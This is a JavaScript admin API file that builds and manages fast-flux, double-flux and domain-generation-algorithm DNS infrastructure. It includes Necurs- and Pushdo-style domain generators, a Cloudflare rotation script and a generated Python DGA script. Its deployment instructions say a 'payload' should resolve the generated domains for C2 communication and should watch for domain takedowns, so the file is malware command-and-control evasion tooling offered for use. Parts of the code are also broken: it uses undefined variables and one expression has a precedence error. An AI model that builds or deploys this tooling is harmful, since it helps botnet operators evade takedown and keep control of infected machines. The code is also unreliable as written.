// vercel-dashboard/api/admin/fastFlux.js
// Fast Flux DNS / DGA Configuration

import { verifyPayloadApiKey } from '../auth/middleware.js';
import { logAuditEntry, AuditActions, AuditSeverity, ResourceTypes } from './audit.js';

export default async function handler(request, response) {
  response.setHeader('Access-Control-Allow-Origin', '*');
  response.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
  response.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');

  if (request.method === 'OPTIONS') return response.status(200).end();

  const auth = await verifyPayloadApiKey(request);
  if (!auth.valid || auth.role !== 'admin') {
    return response.status(403).json({ error: 'Admin access required' });
  }

  try {
    switch (request.method) {
      case 'GET':
        return await handleGet(request, response);
      case 'POST':
        return await handlePost(request, response);
      case 'PUT':
        return await handlePut(request, response);
      case 'DELETE':
        return await handleDelete(request, response);
      default:
        return response.status(405).json({ error: 'Method not allowed' });
    }
  } catch (error) {
    console.error('Fast flux error:', error);
    return response.status(500).json({ error: 'Internal server error' });
  }
}

async function handleGet(request, response) {
  const { action, configId } = request.query;

  if (action === 'list') {
    const configIds = await kv.smembers('global:fastflux:configs') || [];
    const configs = [];

    for (const id of configIds) {
      const config = await kv.get(`fastflux:config:${id}`);
      if (config) {
        configs.push({
          id: config.id,
          name: config.name,
          type: config.type, // 'fast-flux', 'double-flux', 'dga'
          domainsCount: config.domains?.length || 0,
          activeDomains: config.domains?.filter(d => d.active).length || 0,
          nameserversCount: config.nameservers?.length || 0,
          status: config.status,
          ttl: config.ttl,
          rotationInterval: config.rotationInterval,
          createdAt: config.createdAt,
          lastRotated: config.lastRotated,
        });
      }
    }

    return response.json({ configs });
  }

  if (action === 'domains' && configId) {
    const config = await kv.get(`fastflux:config:${configId}`);
    if (!config) return response.status(404).json({ error: 'Config not found' });

    const domains = config.domains || [];
    return response.json({ 
      domains: domains.map(d => ({
        domain: d.domain,
        active: d.active,
        ip: d.ip,
        nameserver: d.nameserver,
        lastRotated: d.lastRotated,
        rotationCount: d.rotationCount,
      })),
      total: domains.length,
      active: domains.filter(d => d.active).length,
    });
  }

  if (action === 'dga' && configId) {
    const config = await kv.get(`fastflux:config:${configId}`);
    if (!config) return response.status(404).json({ error: 'Config not found' });

    if (config.type !== 'dga') {
      return response.status(400).json({ error: 'Not a DGA configuration' });
    }

    const domains = generateDgaDomains(config.dgaConfig, 100);
    return response.json({ 
      sampleDomains: domains,
      totalPossible: calculateDgaTotal(config.dgaConfig),
      seed: config.dgaConfig.seed,
    });
  }

  return response.status(400).json({ error: 'Invalid action' });
}

async function handlePost(request, response) {
  const { action, name, type, domains, nameservers, ttl, rotationInterval, dgaConfig } = request.body;

  if (action === 'create') {
    return await createFastFluxConfig(response, { name, type, domains, nameservers, ttl, rotationInterval, dgaConfig });
  }

  if (action === 'rotate' && request.body.configId) {
    return await rotateDomains(response, request.body.configId);
  }

  if (action === 'generate-dga' && request.body.configId) {
    return await generateDgaList(response, request.body.configId, request.body.count || 1000);
  }

  return response.status(400).json({ error: 'Invalid action' });
}

async function handlePut(request, response) {
  const { configId, ...updates } = request.body;
  if (!configId) return response.status(400).json({ error: 'configId required' });

  const config = await kv.get(`fastflux:config:${configId}`);
  if (!config) return response.status(404).json({ error: 'Config not found' });

  const updated = {
    ...config,
    ...updates,
    updatedAt: new Date().toISOString(),
  };

  await kv.set(`fastflux:config:${configId}`, updated);

  await logAuditEntry({
    actorId: 'admin',
    action: AuditActions.SETTINGS_CHANGED,
    resourceType: ResourceTypes.SETTINGS,
    resourceId: configId,
    severity: AuditSeverity.INFO,
    details: { type: 'fast_flux_updated', updates: Object.keys(updates) },
  });

  return response.json(updated);
}

async function handleDelete(request, response) {
  const { configId } = request.query;
  if (!configId) return response.status(400).json({ error: 'configId required' });

  const config = await kv.get(`fastflux:config:${configId}`);
  if (!config) return response.status(404).json({ error: 'Config not found' });

  // Clean up associated domains/nameservers
  if (config.domains) {
    for (const domain of config.domains) {
      await kv.del(`fastflux:domain:${domain.domain}`);
    }
  }

  await kv.del(`fastflux:config:${configId}`);
  await kv.srem('global:fastflux:configs', configId);

  await logAuditEntry({
    actorId: 'admin',
    action: AuditActions.DATA_DELETED,
    resourceType: ResourceTypes.SETTINGS,
    resourceId: configId,
    severity: AuditSeverity.WARNING,
    details: { type: 'fast_flux_deleted', name: config.name },
  });

  return response.json({ success: true, deleted: configId });
}

async function createFastFluxConfig(response, config) {
  if (!name || !type) {
    return response.status(400).json({ error: 'name and type required' });
  }

  const validTypes = ['fast-flux', 'double-flux', 'dga'];
  if (!validTypes.includes(type)) {
    return response.status(400).json({ error: `Invalid type. Must be one of: ${validTypes.join(', ')}` });
  }

  const configId = `ff_${Date.now()}_${Math.random().toString(36).substring(7)}`;

  const fastFluxConfig = {
    id: configId,
    name,
    type,
    domains: domains || [],
    nameservers: nameservers || [],
    ttl: ttl || 300, // 5 minutes default
    rotationInterval: rotationInterval || 300, // 5 minutes default
    dgaConfig: dgaConfig || null,
    status: 'created',
    createdAt: new Date().toISOString(),
    updatedAt: new Date().toISOString(),
    lastRotated: null,
    // Metadata
    metadata: {
      registrar: 'auto', // Would integrate with registrar APIs
      dnsProvider: 'cloudflare', // Cloudflare, Route53, etc.
      ipPool: [], // Pool of IPs to rotate through
    },
  };

  // Register domains in index
  if (domains) {
    for (const domain of domains) {
      await kv.set(`fastflux:domain:${domain.domain}`, {
        configId,
        domain: domain.domain,
        active: true,
        addedAt: new Date().toISOString(),
      });
    }
  }

  await kv.set(`fastflux:config:${configId}`, fastFluxConfig);
  await kv.sadd('global:fastflux:configs', configId);

  // Generate deployment artifacts
  const artifacts = generateDeploymentArtifacts(fastFluxConfig);

  await logAuditEntry({
    actorId: 'admin',
    action: 'fast_flux_created',
    resourceType: ResourceTypes.SETTINGS,
    resourceId: configId,
    severity: AuditSeverity.INFO,
    details: { type, domainsCount: domains?.length || 0 },
  });

  return response.status(201).json({
    config: fastFluxConfig,
    artifacts,
    instructions: generateDeploymentInstructions(fastFluxConfig, artifacts),
  });
}

async function rotateDomains(response, configId) {
  const config = await kv.get(`fastflux:config:${configId}`);
  if (!config) return response.status(404).json({ error: 'Config not found' });

  if (config.type === 'dga') {
    return response.status(400).json({ error: 'DGA configs use generate-dga action' });
  }

  const rotated = [];
  const errors = [];

  for (const domain of config.domains || []) {
    try {
      // Select new IP from pool
      const newIp = selectIpFromPool(config.metadata.ipPool);
      
      // Update DNS record (would use DNS provider API)
      const success = await updateDnsRecord(domain.domain, newIp, config.ttl);
      
      if (success) {
        domain.ip = newIp;
        domain.lastRotated = new Date().toISOString();
        domain.rotationCount = (domain.rotationCount || 0) + 1;
        rotated.push(domain.domain);
      } else {
        errors.push({ domain: domain.domain, error: 'DNS update failed' });
      }
    } catch (error) {
      errors.push({ domain: domain.domain, error: error.message });
    }
  }

  config.lastRotated = new Date().toISOString();
  await kv.set(`fastflux:config:${configId}`, config);

  // Also rotate nameservers if double-flux
  if (config.type === 'double-flux' && config.nameservers) {
    for (const ns of config.nameservers) {
      try {
        const newIp = selectIpFromPool(config.metadata.ipPool);
        await updateDnsRecord(ns.hostname, newIp, config.ttl);
        ns.ip = newIp;
        ns.lastRotated = new Date().toISOString();
      } catch (error) {
        errors.push({ nameserver: ns.hostname, error: error.message });
      }
    }
  }

  await logAuditEntry({
    actorId: 'admin',
    action: 'fast_flux_rotated',
    resourceType: ResourceTypes.SETTINGS,
    resourceId: configId,
    severity: AuditSeverity.INFO,
    details: { rotated: rotated.length, errors: errors.length },
  });

  return response.json({ rotated, errors, rotationTime: config.lastRotated });
}

async function generateDgaList(response, configId, count) {
  const config = await kv.get(`fastflux:config:${configId}`);
  if (!config) return response.status(404).json({ error: 'Config not found' });

  if (config.type !== 'dga' || !config.dgaConfig) {
    return response.status(400).json({ error: 'Not a DGA configuration' });
  }

  const domains = generateDgaDomains(config.dgaConfig, count);
  
  // Store for later use
  await kv.set(`fastflux:dga:${configId}:domains`, {
    domains,
    generatedAt: new Date().toISOString(),
    config: config.dgaConfig,
  });

  return response.json({ 
    domains,
    count: domains.length,
    seed: config.dgaConfig.seed,
    algorithm: config.dgaConfig.algorithm,
  });
}

function generateDgaDomains(dgaConfig, count) {
  const { algorithm, seed, tlds, length, prefix, suffix, dateBased } = dgaConfig;
  const domains = [];

  for (let i = 0; i < count; i++) {
    let domain = '';

    if (algorithm === 'necurs') {
      // Necurs-style DGA
      domain = generateNecursDomain(seed, i, length);
    } else if (algorithm === 'pushdo') {
      domain = generatePushdoDomain(seed, i, length);
    } else if (algorithm === 'custom') {
      domain = generateCustomDomain(seed, i, length, prefix, suffix);
    } else {
      // Default: simple pseudorandom
      domain = generateSimpleDomain(seed, i, length);
    }

    // Add date-based component if enabled
    if (dateBased) {
      const date = new Date();
      domain += date.getUTCDate().toString().padStart(2, '0') +
                (date.getUTCMonth() + 1).toString().padStart(2, '0') +
                date.getUTCFullYear().toString().slice(-2);
    }

    // Add TLD
    const tld = tlds[Math.floor(Math.random() * tlds.length)];
    domains.push(`${domain}.${tld}`);
  }

  return domains;
}

function generateNecursDomain(seed, index, length) {
  // Simplified Necurs DGA
  const chars = 'abcdefghijklmnopqrstuvwxyz';
  let domain = '';
  let state = seed + index;
  
  for (let i = 0; i < length; i++) {
    state = (state * 214013 + 2531011) & 0xFFFFFFFF;
    domain += chars[(state >> 16) & 0x1F % chars.length];
  }
  
  return domain;
}

function generatePushdoDomain(seed, index, length) {
  // Simplified Pushdo DGA
  const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
  let domain = '';
  let state = seed ^ index;
  
  for (let i = 0; i < length; i++) {
    state = (state * 1103515245 + 12345) & 0x7FFFFFFF;
    domain += chars[state % chars.length];
  }
  
  return domain;
}

function generateCustomDomain(seed, index, length, prefix = '', suffix = '') {
  const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
  let domain = prefix;
  let state = seed + index * 1337;
  
  for (let i = 0; i < length - prefix.length - suffix.length; i++) {
    state = (state * 1664525 + 1013904223) & 0xFFFFFFFF;
    domain += chars[state % chars.length];
  }
  
  return domain + suffix;
}

function generateSimpleDomain(seed, index, length) {
  const chars = 'abcdefghijklmnopqrstuvwxyz';
  let domain = '';
  let state = seed + index;
  
  for (let i = 0; i < length; i++) {
    state = (state * 1103515245 + 12345) & 0x7FFFFFFF;
    domain += chars[state % chars.length];
  }
  
  return domain;
}

function calculateDgaTotal(dgaConfig) {
  const { tlds, length } = dgaConfig;
  const chars = 36; // a-z + 0-9
  return Math.pow(chars, length) * tlds.length;
}

function selectIpFromPool(ipPool) {
  if (!ipPool || ipPool.length === 0) {
    // Generate random IP from common ranges
    const ranges = [
      '192.168.', '10.', '172.16.', '172.17.', '172.18.', '172.19.',
      '203.0.113.', '198.51.100.', '192.0.2.',
    ];
    const range = ranges[Math.floor(Math.random() * ranges.length)];
    return range + Math.floor(Math.random() * 256);
  }
  return ipPool[Math.floor(Math.random() * ipPool.length)];
}

async function updateDnsRecord(domain, ip, ttl) {
  // In production, use Cloudflare API, Route53, etc.
  // For now, simulate
  console.log(`Updating DNS: ${domain} -> ${ip} (TTL: ${ttl})`);
  return true;
}

function generateDeploymentArtifacts(config) {
  return {
    dnsRecords: generateDnsRecords(config),
    cloudflare: generateCloudflareDnsConfig(config),
    route53: generateRoute53Config(config),
    bind: generateBindConfig(config),
    script: generateRotationScript(config),
    dgaScript: config.type === 'dga' ? generateDgaScript(config) : null,
  };
}

function generateDnsRecords(config) {
  const records = [];
  
  for (const domain of config.domains || []) {
    records.push({
      type: 'A',
      name: domain.domain,
      value: domain.ip,
      ttl: config.ttl,
    });
  }
  
  for (const ns of config.nameservers || []) {
    records.push({
      type: 'NS',
      name: ns.hostname,
      value: ns.ip,
      ttl: config.ttl,
    });
    records.push({
      type: 'A',
      name: ns.hostname.replace('ns.', ''),
      value: ns.ip,
      ttl: config.ttl,
    });
  }
  
  return records;
}

function generateCloudflareDnsConfig(config) {
  return {
    zoneId: '<ZONE_ID>',
    records: generateDnsRecords(config).map(r => ({
      type: r.type,
      name: r.name.replace(/\.example\.com$/, ''),
      content: r.value,
      ttl: r.ttl,
      proxied: false, // Don't proxy fast flux domains
    })),
  };
}

function generateRoute53Config(config) {
  return {
    hostedZoneId: '<HOSTED_ZONE_ID>',
    changes: generateDnsRecords(config).map(r => ({
      action: 'UPSERT',
      resourceRecordSet: {
        name: r.name,
        type: r.type,
        ttl: r.ttl,
        resourceRecords: [{ value: r.value }],
      },
    })),
  };
}

function generateBindConfig(config) {
  let zone = `$TTL ${config.ttl}
@   IN  SOA  ns1.example.com. admin.example.com. (
        ${Date.now()}  ; Serial
        3600          ; Refresh
        1800          ; Retry
        604800        ; Expire
        86400         ; Minimum
    )
`;

  for (const domain of config.domains || []) {
    zone += `${domain.domain.replace(/\.example\.com$/, '')}  IN  A  ${domain.ip}\n`;
  }
  
  for (const ns of config.nameservers || []) {
    zone += `ns.${ns.hostname.replace(/\.example\.com$/, '')}  IN  A  ${ns.ip}\n`;
  }
  
  return zone;
}

function generateRotationScript(config) {
  return `#!/bin/bash
# Fast Flux DNS Rotation Script
# Config: ${config.name} (${config.id})
# Type: ${config.type}

API_TOKEN="<YOUR_DNS_PROVIDER_TOKEN>"
ZONE_ID="<ZONE_ID>"
TTL=${config.ttl}
IP_POOL=(${config.metadata.ipPool.join(' ')})

rotate_domain() {
  local domain=\$1
  local new_ip=\${IP_POOL[\$RANDOM % \${#IP_POOL[@]}]}
  
  # Update DNS record via API
  curl -X PUT "https://api.cloudflare.com/client/v4/zones/\${ZONE_ID}/dns_records/\$(get_record_id \$domain)" \\
    -H "Authorization: Bearer \${API_TOKEN}" \\
    -H "Content-Type: application/json" \\
    --data "{\\\"type\\\":\\\"A\\\",\\\"name\\\":\\\"\$domain\\\",\\\"content\\\":\\\"\$new_ip\\\",\\\"ttl\\\":\${TTL}}"
  
  echo "Rotated \$domain -> \$new_ip"
}

get_record_id() {
  local domain=\$1
  curl -s -X GET "https://api.cloudflare.com/client/v4/zones/\${ZONE_ID}/dns_records?name=\$domain" \\
    -H "Authorization: Bearer \${API_TOKEN}" \\
    -H "Content-Type: application/json" | jq -r '.result[0].id'
}

# Rotate all domains
for domain in ${config.domains?.map(d => d.domain).join(' ') || ''}; do
  rotate_domain \$domain
done

# Rotate nameservers if double-flux
${config.type === 'double-flux' ? `
for ns in ${config.nameservers?.map(n => n.hostname).join(' ') || ''}; do
  rotate_domain \$ns
done
` : ''}
`;
}

function generateDgaScript(config) {
  if (config.type !== 'dga') return null;
  
  return `#!/usr/bin/env python3
# DGA Domain Generator
# Config: ${config.name} (${config.id})
# Algorithm: ${config.dgaConfig?.algorithm}

import sys
import hashlib
from datetime import datetime

def generate_domains(count, seed, algorithm, length, tlds, prefix='', suffix='', date_based=False):
    domains = []
    for i in range(count):
        if algorithm == 'necurs':
            domain = generate_necurs(seed, i, length)
        elif algorithm == 'pushdo':
            domain = generate_pushdo(seed, i, length)
        elif algorithm == 'custom':
            domain = generate_custom(seed, i, length, prefix, suffix)
        else:
            domain = generate_simple(seed, i, length)
        
        if date_based:
            now = datetime.utcnow()
            domain += f"{now.day:02d}{now.month:02d}{now.year % 100:02d}"
        
        tld = tlds[i % len(tlds)]
        domains.append(f"{domain}.{tld}")
    return domains

def generate_necurs(seed, index, length):
    chars = 'abcdefghijklmnopqrstuvwxyz'
    domain = ''
    state = seed + index
    for _ in range(length):
        state = (state * 214013 + 2531011) & 0xFFFFFFFF
        domain += chars[(state >> 16) & 0x1F % len(chars)]
    return domain

def generate_pushdo(seed, index, length):
    chars = 'abcdefghijklmnopqrstuvwxyz0123456789'
    domain = ''
    state = seed ^ index
    for _ in range(length):
        state = (state * 1103515245 + 12345) & 0x7FFFFFFF
        domain += chars[state % len(chars)]
    return domain

def generate_custom(seed, index, length, prefix, suffix):
    chars = 'abcdefghijklmnopqrstuvwxyz0123456789'
    domain = prefix
    state = seed + index * 1337
    for _ in range(length - len(prefix) - len(suffix)):
        state = (state * 1664525 + 1013904223) & 0xFFFFFFFF
        domain += chars[state % len(chars)]
    return domain + suffix

def generate_simple(seed, index, length):
    chars = 'abcdefghijklmnopqrstuvwxyz'
    domain = ''
    state = seed + index
    for _ in range(length):
        state = (state * 1103515245 + 12345) & 0x7FFFFFFF
        domain += chars[state % len(chars)]
    return domain

if __name__ == '__main__':
    config = {
        'seed': ${config.dgaConfig?.seed || 1337},
        'algorithm': '${config.dgaConfig?.algorithm || 'simple'}',
        'length': ${config.dgaConfig?.length || 12},
        'tlds': ${JSON.stringify(config.dgaConfig?.tlds || ['com', 'net', 'org'])},
        'prefix': '${config.dgaConfig?.prefix || ''}',
        'suffix': '${config.dgaConfig?.suffix || ''}',
        'date_based': ${config.dgaConfig?.dateBased || false},
    }
    
    count = int(sys.argv[1]) if len(sys.argv) > 1 else 1000
    domains = generate_domains(count, **config)
    
    for domain in domains:
        print(domain)
`;
}

function generateDeploymentInstructions(config, artifacts) {
  return `
# Fast Flux / DGA Deployment Instructions for ${config.name}

## Type: ${config.type.toUpperCase()}
## TTL: ${config.ttl}s
## Rotation Interval: ${config.rotationInterval}s

## DNS Records to Create
${artifacts.dnsRecords.map(r => `${r.type} ${r.name} -> ${r.value} (TTL: ${r.ttl})`).join('\n')}

## Deployment

### 1. Cloudflare (Recommended)
\`\`\`bash
# Use Cloudflare API or dashboard to create records
# Set "Proxied" to OFF (gray cloud) for fast flux domains
# TTL: ${config.ttl} (or "Auto" for 300s minimum)
\`\`\`

### 2. Route53
\`\`\`bash
aws route53 change-resource-record-sets --hosted-zone-id <ZONE_ID> --change-batch file://route53-changes.json
\`\`\`

### 3. BIND / Self-hosted
\`\`\`bash
# Add to zone file
# Run rotation script via cron every ${config.rotationInterval}s
crontab -e
# */5 * * * * /path/to/rotate.sh
\`\`\`

## Rotation Script
Save as \`rotate.sh\` and make executable:
\`\`\`bash
chmod +x rotate.sh
./rotate.sh
\`\`\`

## DGA Domains (if applicable)
${config.type === 'dga' ? `
Generate domains for payload:
\`\`\`bash
python3 dga_generator.py 10000 > domains.txt
\`\`\`

Payload should:
1. Generate domains using same seed/algorithm
2. Try resolving each until one responds
3. Use resolved IP for C2 communication
` : ''}

## Monitoring
- Monitor DNS query logs for NXDOMAIN spikes
- Track rotation success/failure rates
- Alert on domain takedowns
- Monitor IP pool health
`;
}